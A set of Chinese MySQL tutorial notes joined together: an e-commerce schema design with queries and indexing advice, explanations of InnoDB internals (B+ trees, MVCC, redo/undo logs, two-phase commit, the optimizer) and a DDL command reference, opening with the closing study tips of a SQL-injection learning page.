2. **实践操作**：搭建测试环境，进行攻防演练
3. **学习工具**：掌握 SQLMap、Burp Suite 等工具
4. **代码审计**：学习如何查找和修复漏洞
5. **持续学习**：关注新的攻击技术和防御方法

<!-- ============ 文档分隔线：020-mysql/080-MySQLProjectExampleDatabaseDesign.md ============ -->

| 商品管理 | SPU/SKU、分类、品牌、属性    |
| -------- | ---------------------------- |
| 购物车   | 加购、修改数量、删除         |
| 订单系统 | 下单、支付、发货、收货、退款 |
| 搜索     | 全文搜索、分类筛选、排序     |
| 统计报表 | 销售统计、用户分析、库存预警 |

## 需求分析

### ER 图设计

```mermaid
erDiagram
    users ||--o{ orders : 下单
    orders ||--|{ order_items : 包含
    orders ||--o{ payments : 支付
    users ||--o{ addresses : 拥有
    products ||--o{ skus : 规格
    products }o--o{ categories : 分类
    products }o--o{ brands : 品牌
    products }o--o{ attributes : 属性
```

### 核心实体关系

- 用户 1:N 订单
- 订单 1:N 订单项
- 订单 1:1 支付
- 商品 1:N SKU
- 分类 1:N 商品（支持多级分类）
- SKU 1:N 订单项

## 完整建表 SQL

### 用户模块

```sql
CREATE TABLE users (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    username        VARCHAR(50)     NOT NULL,
    email           VARCHAR(100)    NOT NULL,
    phone           VARCHAR(20)     DEFAULT NULL,
    password_hash   VARCHAR(255)    NOT NULL,
    nickname        VARCHAR(50)     DEFAULT NULL,
    avatar_url      VARCHAR(500)    DEFAULT NULL,
    gender          TINYINT         DEFAULT 0 COMMENT '0-unknown, 1-male, 2-female',
    birthday        DATE            DEFAULT NULL,
    status          TINYINT         NOT NULL DEFAULT 1 COMMENT '0-disabled, 1-active, 2-banned',
    last_login_at   DATETIME        DEFAULT NULL,
    last_login_ip   VARCHAR(45)     DEFAULT NULL,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_username (username),
    UNIQUE KEY uk_email (email),
    UNIQUE KEY uk_phone (phone),
    KEY idx_status (status),
    KEY idx_created_at (created_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='User accounts';

CREATE TABLE user_addresses (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    user_id         BIGINT UNSIGNED NOT NULL,
    receiver_name   VARCHAR(50)     NOT NULL,
    receiver_phone  VARCHAR(20)     NOT NULL,
    province        VARCHAR(50)     NOT NULL,
    city            VARCHAR(50)     NOT NULL,
    district        VARCHAR(50)     NOT NULL,
    detail_address  VARCHAR(255)    NOT NULL,
    postal_code     VARCHAR(10)     DEFAULT NULL,
    is_default      TINYINT         NOT NULL DEFAULT 0,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    KEY idx_user_id (user_id),
    CONSTRAINT fk_address_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='User shipping addresses';
```

### 商品模块

```sql
CREATE TABLE categories (
    id              INT UNSIGNED    NOT NULL AUTO_INCREMENT,
    parent_id       INT UNSIGNED    DEFAULT 0 COMMENT '0 means root category',
    name            VARCHAR(50)     NOT NULL,
    icon            VARCHAR(255)    DEFAULT NULL,
    sort_order      INT             NOT NULL DEFAULT 0,
    is_visible      TINYINT         NOT NULL DEFAULT 1,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    KEY idx_parent_id (parent_id),
    KEY idx_sort_order (sort_order)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Product categories (tree structure)';

CREATE TABLE brands (
    id              INT UNSIGNED    NOT NULL AUTO_INCREMENT,
    name            VARCHAR(100)    NOT NULL,
    logo_url        VARCHAR(500)    DEFAULT NULL,
    description     TEXT            DEFAULT NULL,
    sort_order      INT             NOT NULL DEFAULT 0,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_name (name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Product brands';

CREATE TABLE products (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    category_id     INT UNSIGNED    NOT NULL,
    brand_id        INT UNSIGNED    DEFAULT NULL,
    name            VARCHAR(200)    NOT NULL,
    subtitle        VARCHAR(255)    DEFAULT NULL,
    main_image      VARCHAR(500)    DEFAULT NULL,
    sub_images      JSON            DEFAULT NULL COMMENT 'Array of image URLs',
    detail          TEXT            DEFAULT NULL COMMENT 'Product detail HTML',
    detail_html     MEDIUMTEXT      DEFAULT NULL,
    price_min       DECIMAL(10,2)   NOT NULL COMMENT 'Minimum SKU price',
    price_max       DECIMAL(10,2)   NOT NULL COMMENT 'Maximum SKU price',
    status          TINYINT         NOT NULL DEFAULT 0 COMMENT '0-draft, 1-on_sale, 2-off_sale, 3-deleted',
    sort_order      INT             NOT NULL DEFAULT 0,
    sales_count     INT UNSIGNED    NOT NULL DEFAULT 0,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    KEY idx_category_id (category_id),
    KEY idx_brand_id (brand_id),
    KEY idx_status_sort (status, sort_order),
    KEY idx_price_min (price_min),
    KEY idx_sales_count (sales_count),
    KEY idx_name (name),
    FULLTEXT KEY ft_name_subtitle (name, subtitle),
    CONSTRAINT fk_product_category FOREIGN KEY (category_id) REFERENCES categories(id),
    CONSTRAINT fk_product_brand FOREIGN KEY (brand_id) REFERENCES brands(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Product SPU';

CREATE TABLE product_skus (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    product_id      BIGINT UNSIGNED NOT NULL,
    sku_code        VARCHAR(64)     NOT NULL,
    name            VARCHAR(200)    NOT NULL,
    attributes      JSON            NOT NULL COMMENT 'SKU attributes, e.g. {"color":"red","size":"XL"}',
    price           DECIMAL(10,2)   NOT NULL,
    original_price  DECIMAL(10,2)   DEFAULT NULL,
    stock           INT UNSIGNED    NOT NULL DEFAULT 0,
    low_stock       INT UNSIGNED    NOT NULL DEFAULT 10 COMMENT 'Low stock threshold',
    sales           INT UNSIGNED    NOT NULL DEFAULT 0,
    image_url       VARCHAR(500)    DEFAULT NULL,
    status          TINYINT         NOT NULL DEFAULT 1 COMMENT '0-disabled, 1-enabled',
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_sku_code (sku_code),
    KEY idx_product_id (product_id),
    KEY idx_price (price),
    KEY idx_stock (stock),
    CONSTRAINT fk_sku_product FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Product SKU';
```

### 购物车模块

```sql
CREATE TABLE cart_items (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    user_id         BIGINT UNSIGNED NOT NULL,
    sku_id          BIGINT UNSIGNED NOT NULL,
    quantity        INT UNSIGNED    NOT NULL DEFAULT 1,
    checked         TINYINT         NOT NULL DEFAULT 1 COMMENT '0-unchecked, 1-checked',
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_user_sku (user_id, sku_id),
    KEY idx_user_id (user_id),
    CONSTRAINT fk_cart_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    CONSTRAINT fk_cart_sku FOREIGN KEY (sku_id) REFERENCES product_skus(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Shopping cart items';
```

### 订单模块

```sql
CREATE TABLE orders (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    order_no        VARCHAR(32)     NOT NULL,
    user_id         BIGINT UNSIGNED NOT NULL,
    total_amount    DECIMAL(12,2)   NOT NULL,
    pay_amount      DECIMAL(12,2)   NOT NULL COMMENT 'Actual payment amount',
    freight_amount  DECIMAL(10,2)   NOT NULL DEFAULT 0.00,
    discount_amount DECIMAL(10,2)   NOT NULL DEFAULT 0.00,
    pay_type        TINYINT         DEFAULT NULL COMMENT '1-alipay, 2-wechat, 3-card',
    status          TINYINT         NOT NULL DEFAULT 0 COMMENT '0-pending, 1-paid, 2-shipped, 3-delivered, 4-cancelled, 5-refunding, 6-refunded',
    receiver_name   VARCHAR(50)     NOT NULL,
    receiver_phone  VARCHAR(20)     NOT NULL,
    receiver_address VARCHAR(500)   NOT NULL,
    remark          VARCHAR(500)    DEFAULT NULL,
    paid_at         DATETIME        DEFAULT NULL,
    shipped_at      DATETIME        DEFAULT NULL,
    delivered_at    DATETIME        DEFAULT NULL,
    cancelled_at    DATETIME        DEFAULT NULL,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_order_no (order_no),
    KEY idx_user_id (user_id),
    KEY idx_status (status),
    KEY idx_created_at (created_at),
    KEY idx_user_status (user_id, status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Orders';

CREATE TABLE order_items (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    order_id        BIGINT UNSIGNED NOT NULL,
    sku_id          BIGINT UNSIGNED NOT NULL,
    product_id      BIGINT UNSIGNED NOT NULL,
    product_name    VARCHAR(200)    NOT NULL COMMENT 'Snapshot at order time',
    sku_name        VARCHAR(200)    NOT NULL,
    sku_attributes  JSON            DEFAULT NULL,
    product_image   VARCHAR(500)    DEFAULT NULL,
    price           DECIMAL(10,2)   NOT NULL COMMENT 'Unit price at order time',
    quantity        INT UNSIGNED    NOT NULL,
    subtotal        DECIMAL(12,2)   NOT NULL,
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    KEY idx_order_id (order_id),
    KEY idx_product_id (product_id),
    KEY idx_sku_id (sku_id),
    CONSTRAINT fk_item_order FOREIGN KEY (order_id) REFERENCES orders(id),
    CONSTRAINT fk_item_product FOREIGN KEY (product_id) REFERENCES products(id),
    CONSTRAINT fk_item_sku FOREIGN KEY (sku_id) REFERENCES product_skus(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Order line items';

CREATE TABLE payments (
    id              BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    order_id        BIGINT UNSIGNED NOT NULL,
    transaction_no  VARCHAR(64)     DEFAULT NULL COMMENT 'Third-party payment transaction number',
    pay_type        TINYINT         NOT NULL COMMENT '1-alipay, 2-wechat, 3-card',
    amount          DECIMAL(12,2)   NOT NULL,
    status          TINYINT         NOT NULL DEFAULT 0 COMMENT '0-pending, 1-success, 2-failed, 3-refunded',
    paid_at         DATETIME        DEFAULT NULL,
    callback_data   JSON            DEFAULT NULL COMMENT 'Payment gateway callback data',
    created_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at      DATETIME        NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    UNIQUE KEY uk_order_id (order_id),
    KEY idx_transaction_no (transaction_no),
    KEY idx_status (status),
    CONSTRAINT fk_payment_order FOREIGN KEY (order_id) REFERENCES orders(id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  COMMENT='Payment records';
```

## 常用查询

### 商品搜索与筛选

```sql
SELECT p.id, p.name, p.subtitle, p.main_image, p.price_min, p.price_max,
       p.sales_count, c.name AS category_name, b.name AS brand_name
FROM products p
LEFT JOIN categories c ON p.category_id = c.id
LEFT JOIN brands b ON p.brand_id = b.id
WHERE p.status = 1
  AND p.category_id = 5
  AND p.price_min BETWEEN 100 AND 500
ORDER BY p.sales_count DESC
LIMIT 20 OFFSET 0;
```

### 用户订单查询

```sql
SELECT o.order_no, o.total_amount, o.status, o.created_at,
       oi.product_name, oi.sku_name, oi.price, oi.quantity, oi.subtotal
FROM orders o
JOIN order_items oi ON o.id = oi.order_id
WHERE o.user_id = 1001
ORDER BY o.created_at DESC
LIMIT 10;
```

### 销售统计

```sql
SELECT DATE(o.created_at) AS order_date,
       COUNT(DISTINCT o.id) AS order_count,
       SUM(o.pay_amount) AS total_revenue,
       AVG(o.pay_amount) AS avg_order_value
FROM orders o
WHERE o.status IN (1, 2, 3)
  AND o.created_at >= DATE_SUB(CURDATE(), INTERVAL 30 DAY)
GROUP BY DATE(o.created_at)
ORDER BY order_date DESC;
```

### 热销商品排行

```sql
SELECT p.id, p.name, p.main_image,
       SUM(oi.quantity) AS total_sold,
       SUM(oi.subtotal) AS total_revenue
FROM order_items oi
JOIN products p ON oi.product_id = p.id
JOIN orders o ON oi.order_id = o.id
WHERE o.status IN (1, 2, 3)
  AND o.created_at >= DATE_SUB(CURDATE(), INTERVAL 7 DAY)
GROUP BY p.id, p.name, p.main_image
ORDER BY total_sold DESC
LIMIT 20;
```

### 库存预警

```sql
SELECT s.id, s.sku_code, s.name, s.stock, s.low_stock,
       p.name AS product_name
FROM product_skus s
JOIN products p ON s.product_id = p.id
WHERE s.stock <= s.low_stock
  AND s.status = 1
  AND p.status = 1
ORDER BY s.stock ASC;
```

## 索引优化策略

### 索引设计原则

1. **选择性高的列优先** -- 区分度高的列建索引效果更好
2. **覆盖索引** -- 查询的列都在索引中，无需回表
3. **最左前缀** -- 联合索引遵循最左前缀匹配
4. **避免冗余索引** -- (a,b) 包含 (a)，不需要单独建 (a)
5. **控制索引数量** -- 每个索引增加写入开销

### 典型优化案例

```sql
-- 优化前：全表扫描
SELECT * FROM orders WHERE user_id = 1001 AND status = 1;

-- 优化后：使用联合索引
ALTER TABLE orders ADD INDEX idx_user_status (user_id, status);

-- 覆盖索引优化
SELECT order_no, total_amount, created_at
FROM orders
WHERE user_id = 1001 AND status = 1;
-- 联合索引 idx_user_status (user_id, status, created_at, total_amount) 可覆盖
```

## 扩展方向

1. **分库分表** -- 订单表按用户 ID 分片
2. **读写分离** -- 主从复制，读走从库
3. **缓存层** -- Redis 缓存热点商品和库存
4. **ES 搜索** -- Elasticsearch 替代 MySQL 全文搜索
5. **数据仓库** -- 订单数据同步到 ClickHouse 做分析
6. **消息队列** -- 订单创建发送 MQ 异步处理库存扣减

---

## 关键代码速查

### 建表模板

```sql
CREATE TABLE table_name (
    id          BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
    -- columns
    created_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
    updated_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (id),
    KEY idx_col (col)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
```

### 联合索引

```sql
ALTER TABLE orders ADD INDEX idx_user_status_created (user_id, status, created_at);
-- 查询 WHERE user_id = ? AND status = ? 可使用前两列
-- 查询 WHERE user_id = ? 可使用第一列
-- 查询 WHERE status = ? 无法使用此索引
```

### EXPLAIN 分析

```sql
EXPLAIN SELECT * FROM orders WHERE user_id = 1001;
-- 关注：type（ref/range 优于 ALL），key（使用了哪个索引），rows（预估扫描行数）
```

### 事务处理

```sql
START TRANSACTION;
UPDATE product_skus SET stock = stock - 1 WHERE id = 100 AND stock >= 1;
INSERT INTO orders (...) VALUES (...);
COMMIT;
```

<!-- ============ 文档分隔线：020-mysql/081-MySQLTheoryKnowledge.md ============ -->

```text
          [10|20]   [30|40|50]   [60|70|80]
          /    \     /  |  \      /  |  \
        ->10->20->  ->30->40->50->  ->60->70->80->
        |___________leaf linked list______________|
```

### B+ 树 vs B 树

| 特性 | B+ 树 | B 树 |
|------|-------|------|
| 数据存储位置 | 仅叶子节点 | 所有节点 |
| 叶子节点链接 | 双向链表 | 无 |
| 非叶子节点 | 仅存键值+指针 | 存键值+数据+指针 |
| 单次查找 | 必须到叶子节点 | 可能在中间节点找到 |
| 范围查询 | 高效（遍历链表） | 需要中序遍历 |
| 空间利用率 | 非叶子节点更紧凑 | 非叶子节点存数据，扇出低 |

### 为什么 MySQL 选择 B+ 树

1. **磁盘 I/O 优化** -- B+ 树的扇出（fan-out）远大于 B 树，因为非叶子节点不存数据，同样大小的磁盘页能容纳更多键值。一棵 3 层的 B+ 树（假设每页 16KB，键值 8 字节+指针 6 字节）可存储约 2000 万条记录。

2. **范围查询高效** -- 叶子节点的双向链表使得范围查询只需找到起点后顺序遍历，无需回溯父节点。

3. **查询性能稳定** -- 每次查找都从根到叶子，路径长度相同，查询时间稳定。

### B+ 树的插入与分裂

当叶子节点的键值数超过阶数时，节点分裂：

1. 将节点分为两半
2. 中间键值提升到父节点
3. 如果父节点也满了，递归分裂

树的高度增长是从底部向上传播的，这保证了树的平衡性。

### B+ 树与哈希索引的对比

| 特性 | B+ 树 | 哈希索引 |
|------|-------|---------|
| 等值查询 | O(log n) | O(1) |
| 范围查询 | 支持 | 不支持 |
| 排序 | 支持 | 不支持 |
| 最左前缀 | 支持 | 不支持 |
| 存储空间 | 较大 | 较小 |
| 适用场景 | 通用 | 等值查询密集 |

InnoDB 的自适应哈希索引（AHI）会在检测到某些索引页被频繁访问时，自动为这些页构建哈希索引。

---

## MVCC（Multi-Version Concurrency Control）

### MVCC 的目的

MVCC 解决读写冲突问题，使得读操作不阻塞写操作，写操作不阻塞读操作。每个事务看到的是数据在某个时间点的一致性快照。

### InnoDB 的 MVCC 实现

MVCC 通过三个机制协同工作：

1. **隐藏列** -- 每行记录包含两个隐藏列
2. **Undo Log** -- 存储数据的历史版本
3. **Read View** -- 决定事务能看到哪个版本

#### 隐藏列

每行记录包含：
- `DB_TRX_ID`（6 字节）-- 最后修改该行的事务 ID
- `DB_ROLL_PTR`（7 字节）-- 指向 undo log 中该行的前一个版本
- `DB_ROW_ID`（6 字节）-- 隐藏自增 ID（无主键时使用）

#### 版本链

通过 `DB_ROLL_PTR` 将一行数据的多个版本串联成链表：

```text
当前版本: {data_v3, trx_id=300, roll_ptr -> v2}
|
v
历史版本: {data_v2, trx_id=200, roll_ptr -> v1}
|
v
历史版本: {data_v1, trx_id=100, roll_ptr -> NULL}
```

#### Read View

Read View 记录当前活跃事务的 ID 列表，用于判断某个版本对当前事务是否可见。

Read View 包含：
- `m_ids` -- 创建 Read View 时活跃事务 ID 列表
- `min_trx_id` -- `m_ids` 中的最小值
- `max_trx_id` -- 下一个将分配的事务 ID（即当前最大事务 ID + 1）
- `creator_trx_id` -- 创建该 Read View 的事务 ID

可见性判断规则：

1. 如果 `trx_id == creator_trx_id`，可见（自己修改的）
2. 如果 `trx_id < min_trx_id`，可见（事务已提交）
3. 如果 `trx_id >= max_trx_id`，不可见（事务在 Read View 创建后开始）
4. 如果 `min_trx_id <= trx_id < max_trx_id`：
   - 如果 `trx_id` 在 `m_ids` 中，不可见（事务未提交）
   - 如果 `trx_id` 不在 `m_ids` 中，可见（事务已提交）

如果当前版本不可见，沿版本链继续查找前一个版本。

### 不同隔离级别的 Read View 策略

| 隔离级别 | Read View 创建时机 | 效果 |
|---------|-------------------|------|
| READ COMMITTED | 每次 SELECT 创建新 Read View | 可看到其他事务已提交的修改 |
| REPEATABLE READ | 事务中第一次 SELECT 创建 Read View | 事务中始终看到一致的快照 |
| READ UNCOMMITTED | 不使用 Read View | 可看到未提交的修改 |
| SERIALIZABLE | 不使用 MVCC，加锁 | 完全串行化 |

---

## WAL（Write-Ahead Logging）

### WAL 的原理

WAL 的核心思想：在修改数据页之前，先将修改记录写入日志。保证即使系统崩溃，也可以通过日志恢复数据。

```text
事务操作 --> 写入 Redo Log Buffer --> 刷入 Redo Log File --> 修改内存数据页 --> 刷入磁盘数据文件
```

### Redo Log

Redo Log 记录的是物理修改（"在某个页的某个偏移量写入了什么值"），用于崩溃恢复。

Redo Log 的写入流程：

1. 事务修改数据时，先写入 Redo Log Buffer（内存）
2. 根据刷盘策略，将 Redo Log Buffer 刷入 Redo Log File
3. 事务提交时，必须将 Redo Log 刷盘（保证持久性）

刷盘策略由 `innodb_flush_log_at_trx_commit` 控制：

| 值 | 行为 | 安全性 | 性能 |
|----|------|--------|------|
| 0 | 每秒刷盘 | 可能丢失 1 秒数据 | 最高 |
| 1 | 每次提交刷盘 | 不丢数据 | 最低 |
| 2 | 每次提交写入 OS 缓存，每秒 fsync | OS 崩溃可能丢数据 | 中等 |

### Undo Log

Undo Log 记录的是逻辑修改的反向操作（"插入的行需要删除，更新的行需要恢复旧值"），用于：
- 事务回滚
- MVCC 版本链

### Binlog vs Redo Log

| 特性 | Redo Log | Binlog |
|------|----------|--------|
| 存储引擎 | InnoDB 特有 | MySQL Server 层 |
| 内容 | 物理日志（页修改） | 逻辑日志（SQL/行变更） |
| 写入方式 | 循环写，空间固定 | 追加写，文件递增 |
| 用途 | 崩溃恢复 | 主从复制、数据恢复 |
| 事务性 | 事务中持续写入 | 事务提交时一次写入 |

### 两阶段提交

为保证 Redo Log 和 Binlog 的一致性，InnoDB 采用两阶段提交：

1. **Prepare 阶段** -- 写入 Redo Log，标记为 prepare 状态
2. **Commit 阶段** -- 写入 Binlog，将 Redo Log 标记为 commit 状态

如果崩溃发生在 Prepare 后、Commit 前，恢复时检查 Binlog 中是否有对应事务：
- 有：提交事务
- 无：回滚事务

---

## 查询优化器

### 优化器的工作流程

```text
SQL 文本 --> 解析器 --> AST --> 预处理器 --> 逻辑查询计划 --> 优化器 --> 物理查询计划 --> 执行器
```

优化器分为逻辑优化和物理优化：

1. **逻辑优化** -- 基于规则的优化（RBO）
   - 条件下推（Predicate Pushdown）
   - 列裁剪（Column Pruning）
   - 子查询展开
   - 外连接消除
   - 视图合并

2. **物理优化** -- 基于代价的优化（CBO）
   - 选择访问路径（全表扫描 vs 索引扫描）
   - 选择连接算法（Nested Loop、Hash Join、Merge Join）
   - 选择连接顺序
   - 估算代价选择最优计划

### 代价模型

优化器使用代价模型估算不同执行计划的代价：

```text
Total Cost = IO Cost + CPU Cost

IO Cost = 页面读取次数 _ 页面读取代价
CPU Cost = 评估条件次数 _ 条件评估代价 + 排序记录数 \* 排序代价
```

### 索引选择的因素

1. **索引选择性** -- `COUNT(DISTINCT col) / COUNT(*)`，选择性越高越好
2. **索引基数（Cardinality）** -- 索引中不同值的数量
3. **回表代价** -- 二级索引需要回表查询聚簇索引
4. **覆盖索引** -- 查询列都在索引中，无需回表
5. **索引排序** -- 索引本身有序，可避免 filesort
6. **范围条件** -- 范围条件后的索引列无法使用

### 优化器追踪

```sql
SET optimizer_trace = 'enabled=on';
SELECT * FROM orders WHERE user_id = 1001;
SELECT * FROM information_schema.OPTIMIZER_TRACE;
SET optimizer_trace = 'enabled=off';
````

---

## 索引选择

### 索引失效的常见场景

1. **对索引列使用函数**

   ```sql
   SELECT * FROM users WHERE YEAR(created_at) = 2024;  -- 索引失效
   SELECT * FROM users WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';  -- 索引有效
   ```

2. **隐式类型转换**

   ```sql
   SELECT * FROM users WHERE phone = 13800138000;  -- phone 是 VARCHAR，索引失效
   SELECT * FROM users WHERE phone = '13800138000';  -- 索引有效
   ```

3. **LIKE 以通配符开头**

   ```sql
   SELECT * FROM products WHERE name LIKE '%phone';  -- 索引失效
   SELECT * FROM products WHERE name LIKE 'phone%';  -- 索引有效
   ```

4. **OR 条件包含非索引列**

   ```sql
   SELECT * FROM users WHERE email = 'a@b.com' OR nickname = 'test';  -- nickname 无索引，整体失效
   ```

5. **不满足最左前缀**

   ```sql
   INDEX (a, b, c)
   WHERE b = 1 AND c = 2  -- 无法使用索引
   WHERE a = 1 AND c = 2  -- 只能使用 a 列
   WHERE a = 1 AND b = 1  -- 可使用 a, b 两列
   ```

6. **使用 NOT IN、NOT EXISTS、!=**
   ```sql
   SELECT * FROM users WHERE status != 0;  -- 优化器可能选择全表扫描
   ```

### 索引优化策略

1. **联合索引顺序** -- 将选择性高的列放在前面，将范围查询列放在最后
2. **覆盖索引** -- 将查询需要的列包含在索引中，避免回表
3. **索引下推（ICP）** -- MySQL 5.6+ 在存储引擎层过滤索引条件，减少回表次数
4. **MRR（Multi-Range Read）** -- 将随机 I/O 转换为顺序 I/O
5. **索引合并** -- 多个索引合并使用（通常不如联合索引高效）

---

## 理论速查表

| 概念       | 核心要点                         | 关键细节                                |
| ---------- | -------------------------------- | --------------------------------------- |
| B+ 树      | 非叶子节点仅存键值，叶子节点链表 | 3 层约 2000 万行，范围查询高效          |
| MVCC       | 多版本并发控制，读不阻塞写       | 隐藏列 + Undo Log + Read View           |
| WAL        | 先写日志再写数据                 | Redo Log 保证持久性                     |
| Redo Log   | 物理日志，循环写                 | innodb_flush_log_at_trx_commit 控制刷盘 |
| Undo Log   | 逻辑日志，版本链                 | 用于回滚和 MVCC                         |
| Binlog     | 逻辑日志，追加写                 | 用于主从复制                            |
| 两阶段提交 | 保证 Redo Log 和 Binlog 一致     | Prepare -> Binlog -> Commit             |
| 查询优化器 | RBO + CBO                        | 代价模型选择最优执行计划                |
| 索引选择   | 选择性、回表代价、覆盖索引       | 避免索引失效场景                        |

```

```

```

```

## 延伸阅读
MySQL 索引与优化，见 020-mysql 模块文档。
MySQL 日志体系，见 020-mysql 模块 redo/binlog 文档。
Redis 缓存与 MySQL 组合，见 022-redis 模块。

<!-- ============ 文档分隔线：020-mysql/082-DDL.md ============ -->

## 数据库操作

**单行写法：创建数据库**
`CREATE DATABASE [IF NOT EXISTS] <库名> [CHARACTER SET <字符集>] [COLLATE <排序规则>]`
```sql
-- 创建数据库并指定 utf8mb4 字符集
CREATE DATABASE IF NOT EXISTS mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_0900_ai_ci;
```

**单行写法：查看所有数据库**
`SHOW DATABASES;`
```sql
-- 列出所有数据库
SHOW DATABASES;
```

**单行写法：查看建库语句**
`SHOW CREATE DATABASE <库名>;`
```sql
-- 查看 mydb 的建库语句
SHOW CREATE DATABASE mydb;
```

**单行写法：切换数据库**
`USE <库名>;`
```sql
-- 切换到 mydb
USE mydb;
```

**单行写法：修改数据库字符集**
`ALTER DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>;`
```sql
-- 修改数据库字符集与排序规则
ALTER DATABASE mydb CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci;
```

**单行写法：删除数据库**
`DROP DATABASE [IF EXISTS] <库名>;`
```sql
-- 存在时才删除
DROP DATABASE IF EXISTS mydb;
```

---

## 创建表

**换行写法：创建完整表结构**
`CREATE TABLE [IF NOT EXISTS] <表名> (<列定义>[, <表约束>...]) [ENGINE=<引擎>] [DEFAULT CHARSET=<字符集>];`
```sql
-- 创建用户表并指定存储引擎与字符集
CREATE TABLE IF NOT EXISTS users (
  id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY COMMENT '用户ID',
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  email VARCHAR(100) NOT NULL COMMENT '邮箱',
  age INT UNSIGNED COMMENT '年龄',
  balance DECIMAL(10,2) DEFAULT 0.00 COMMENT '余额',
  status TINYINT DEFAULT 1 COMMENT '状态',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
```

**单行写法：仅复制表结构**
`CREATE TABLE <新表> LIKE <源表>;`
```sql
-- 复制表结构不复制数据
CREATE TABLE users_copy LIKE users;
```

**单行写法：复制结构和数据**
`CREATE TABLE <新表> AS SELECT * FROM <源表>;`
```sql
-- 复制表结构和全部数据
CREATE TABLE users_backup AS SELECT * FROM users;
```

**单行写法：复制部分数据**
`CREATE TABLE <新表> AS SELECT * FROM <源表> WHERE <条件>;`
```sql
-- 仅复制符合条件的数据
CREATE TABLE active_users AS SELECT * FROM users WHERE status = 1;
```

---

## 查看表结构

**单行写法：查看表字段**
`DESC <表名>;`
```sql
-- 查看表字段信息
DESC users;
```

**单行写法：查看列详细信息**
`SHOW COLUMNS FROM <表名>;`
```sql
-- 查看列的详细定义
SHOW COLUMNS FROM users;
```

**单行写法：查看建表语句**
`SHOW CREATE TABLE <表名>;`
```sql
-- 查看完整建表语句
SHOW CREATE TABLE users;
```

